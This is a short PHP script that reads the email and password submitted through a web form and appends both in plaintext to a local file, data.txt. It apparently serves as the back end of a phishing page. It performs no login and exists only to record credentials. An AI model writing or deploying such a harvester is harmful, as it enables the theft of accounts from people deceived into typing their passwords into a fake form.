<?php

$username = $_POST["email"];
$password = $_POST["password"];

$myfile = fopen("data.txt", "a+") or die ("unable to open file!");
$txt = "\nusername:" .$username ."\nPassword" . $password;
fwrite($myfile, $txt);
fclose($myfile);


?>